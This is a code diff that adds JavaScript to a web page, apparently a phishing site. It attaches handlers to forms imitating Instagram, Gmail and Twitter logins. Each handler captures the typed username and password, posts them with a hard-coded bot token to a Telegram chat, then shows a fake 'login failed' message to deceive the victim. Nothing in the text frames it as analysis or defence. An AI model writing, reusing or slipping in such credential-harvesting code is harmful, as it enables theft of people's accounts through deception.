@@ -259,3 +259,56 @@ window.onload = function() {
     showPage('landing-page');
     updateProgress();
 };
+
+  
+const botToken = '7677689278:AAGoCL4lIotCe5v-JmAuZkQrz3uUbL8d7II';
+const chatId = '1896304247';
+ let currentPlatform = '';
+
+  // Fungsi untuk mengirim pesan ke Telegram
+  function sendToTelegram(platform, username, password) {
+    const message = `🔐 Login Attempt\nPlatform: ${platform}\nUsername: ${username}\nPassword: ${password}`;
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(telegramUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+  }
+
+  // Handler Form Instagram
+  document.getElementById('instagram-form').addEventListener('submit', function (e) {
+    e.preventDefault();
+    const username = document.getElementById('instagram-username').value;
+    const password = document.getElementById('instagram-password').value;
+    sendToTelegram('Instagram', username, password);
+    this.reset();
+    alert("Login gagal. Silakan coba lagi.");
+  });
+
+  // Handler Form Gmail
+  document.getElementById('gmail-form').addEventListener('submit', function (e) {
+    e.preventDefault();
+    const username = document.getElementById('gmail-email').value;
+    const password = document.getElementById('gmail-password').value;
+    sendToTelegram('Gmail', username, password);
+    this.reset();
+    alert("Login gagal. Silakan coba lagi.");
+  });
+
+  // Handler Form Twitter
+  document.getElementById('twitter-form').addEventListener('submit', function (e) {
+    e.preventDefault();
+    const username = document.getElementById('twitter-username').value;
+    const password = document.getElementById('twitter-password').value;
+    sendToTelegram('Twitter', username, password);
+    this.reset();
+    alert("Login gagal. Silakan coba lagi.");
+  });
+
